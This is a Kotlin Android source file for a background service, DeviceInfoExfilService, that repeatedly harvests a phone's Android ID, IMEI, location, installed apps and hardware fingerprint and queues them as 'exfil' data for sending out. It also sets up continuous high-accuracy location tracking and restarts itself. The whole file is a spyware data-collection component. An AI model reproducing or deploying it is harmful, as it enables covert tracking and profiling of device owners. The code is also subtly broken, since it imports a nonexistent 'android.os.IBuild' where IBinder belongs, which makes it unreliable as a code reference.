package com.yourpackage.services

import android.Manifest
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationManager
import android.os.Build
import android.os.IBuild
import android.os.Looper
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.yourpackage.data.ExfilData
import com.yourpackage.utils.BatchManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

/**
 * Regular service that collects device information:
 * - Device ID / Android ID (dynamic)
 * - Device model and manufacturer
 * - Installed apps list
 * - Location (if permission granted)
 * - IMEI (if permission granted)
 * - Screen resolution
 * - OS version
 */
class DeviceInfoExfilService : Service() {

    companion object {
        private const val TAG = "DeviceInfoExfil"
        private const val COLLECTION_INTERVAL_MS = 600_000L // 10 minutes
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var batchManager: BatchManager
    private lateinit var locationManager: LocationManager
    private var locationCallback: LocationCallback? = null

    /**
     * Get the unique Android ID for this device.
     * This is dynamic and unique per phone.
     */
    private fun getDeviceId(): String {
        return Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ANDROID_ID
        ) ?: "unknown_device"
    }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "✅ DeviceInfoExfilService created. Device ID: ${getDeviceId()}")

        // Initialize batch manager
        batchManager = BatchManager { batch ->
            scope.launch {
                Log.d(TAG, "📦 Device info batch ready: ${batch.size} items")
            }
        }
        batchManager.start()

        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager

        startPeriodicCollection()
        collectDeviceInfo()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "📱 DeviceInfoExfilService started")
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        batchManager.stop()
        stopLocationUpdates()
        Log.d(TAG, "DeviceInfoExfilService destroyed")
    }

    override fun onBind(intent: Intent?): IBuild? {
        return null
    }

    /**
     * Start periodic collection using a scheduled executor.
     */
    private fun startPeriodicCollection() {
        val executor = Executors.newSingleThreadScheduledExecutor()
        executor.scheduleAtFixedRate({
            try {
                collectDeviceInfo()
            } catch (e: Exception) {
                Log.e(TAG, "Error in periodic collection: ${e.message}")
            }
        }, COLLECTION_INTERVAL_MS, COLLECTION_INTERVAL_MS, TimeUnit.MILLISECONDS)
    }

    /**
     * Collect all device information.
     */
    private fun collectDeviceInfo() {
        try {
            val deviceInfo = mutableMapOf<String, Any>()

            // Basic device info
            deviceInfo["device_id"] = getDeviceId()
            deviceInfo["model"] = Build.MODEL
            deviceInfo["manufacturer"] = Build.MANUFACTURER
            deviceInfo["brand"] = Build.BRAND
            deviceInfo["product"] = Build.PRODUCT
            deviceInfo["android_version"] = Build.VERSION.RELEASE
            deviceInfo["sdk_version"] = Build.VERSION.SDK_INT
            deviceInfo["build_id"] = Build.ID
            deviceInfo["display"] = Build.DISPLAY
            deviceInfo["fingerprint"] = Build.FINGERPRINT

            val displayMetrics = resources.displayMetrics
            deviceInfo["screen_width"] = displayMetrics.widthPixels
            deviceInfo["screen_height"] = displayMetrics.heightPixels
            deviceInfo["screen_density"] = displayMetrics.densityDpi

            deviceInfo["installed_apps"] = getInstalledApps()
            deviceInfo["network_type"] = getNetworkType()
            deviceInfo["battery_level"] = getBatteryLevel()

            val location = getLastKnownLocation()
            if (location != null) {
                deviceInfo["location"] = mapOf(
                    "latitude" to location.latitude,
                    "longitude" to location.longitude,
                    "accuracy" to location.accuracy,
                    "provider" to location.provider
                )
            }

            val imei = getImei()
            if (imei != null) {
                deviceInfo["imei"] = imei
            }

            val data = mapOf(
                "type" to "device_info",
                "device_info" to deviceInfo,
                "timestamp" to System.currentTimeMillis()
            )

            val exfilData = ExfilData(
                type = "device_info",
                app = "system",
                data = data.toString(),
                device_id = getDeviceId() // <-- Dynamic Device ID
            )

            batchManager.add(exfilData)
            Log.d(TAG, "📱 Device info collected: ${deviceInfo.size} fields")
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting device info: ${e.message}")
        }
    }

    /**
     * Get the list of installed apps.
     */
    private fun getInstalledApps(): List<String> {
        val packageManager = packageManager
        val apps = mutableListOf<String>()

        try {
            val packages = packageManager.getInstalledPackages(PackageManager.GET_META_DATA)
            packages.forEach { packageInfo ->
                packageInfo.packageName?.let { appName ->
                    apps.add(appName)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error getting installed apps: ${e.message}")
        }

        return apps.take(50)
    }

    /**
     * Get the network type (Wi-Fi or Mobile).
     */
    private fun getNetworkType(): String {
        return try {
            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
            val networkInfo = connectivityManager.activeNetworkInfo
            if (networkInfo != null && networkInfo.isConnected) {
                networkInfo.typeName ?: "Unknown"
            } else {
                "Disconnected"
            }
        } catch (e: Exception) {
            "Unknown"
        }
    }

    /**
     * Get the battery level.
     */
    private fun getBatteryLevel(): Int {
        return try {
            val batteryManager = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        } catch (e: Exception) {
            -1
        }
    }

    /**
     * Get the last known location.
     */
    private fun getLastKnownLocation(): Location? {
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            return null
        }

        return try {
            val location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            if (location != null) {
                return location
            }
            locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
        } catch (e: Exception) {
            Log.e(TAG, "Error getting location: ${e.message}")
            null
        }
    }

    /**
     * Get the device IMEI (if permission granted).
     */
    private fun getImei(): String? {
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_PHONE_STATE
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            return null
        }

        return try {
            val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                telephonyManager.imei
            } else {
                @Suppress("DEPRECATION")
                telephonyManager.deviceId
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error getting IMEI: ${e.message}")
            null
        }
    }

    /**
     * Request location updates (for continuous location tracking).
     */
    private fun startLocationUpdates() {
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            return
        }

        try {
            val locationRequest = LocationRequest.create().apply {
                interval = 60000
                fastestInterval = 30000
                priority = LocationRequest.PRIORITY_HIGH_ACCURACY
            }

            locationCallback = object : LocationCallback() {
                override fun onLocationResult(locationResult: LocationResult) {
                    val location = locationResult.lastLocation
                    if (location != null) {
                        val data = mapOf(
                            "type" to "location_update",
                            "latitude" to location.latitude,
                            "longitude" to location.longitude,
                            "accuracy" to location.accuracy,
                            "provider" to location.provider
                        )
                        val exfilData = ExfilData(
                            type = "device_info",
                            app = "system",
                            data = data.toString(),
                            device_id = getDeviceId() // <-- Dynamic Device ID
                        )
                        batchManager.add(exfilData)
                    }
                }
            }

            LocationServices.getFusedLocationProviderClient(this)
                .requestLocationUpdates(locationRequest, locationCallback!!, Looper.getMainLooper())

            Log.d(TAG, "📍 Location updates started")
        } catch (e: Exception) {
            Log.e(TAG, "Error starting location updates: ${e.message}")
        }
    }

    /**
     * Stop location updates.
     */
    private fun stopLocationUpdates() {
        locationCallback?.let {
            LocationServices.getFusedLocationProviderClient(this)
                .removeLocationUpdates(it)
        }
        locationCallback = null
        Log.d(TAG, "📍 Location updates stopped")
    }
}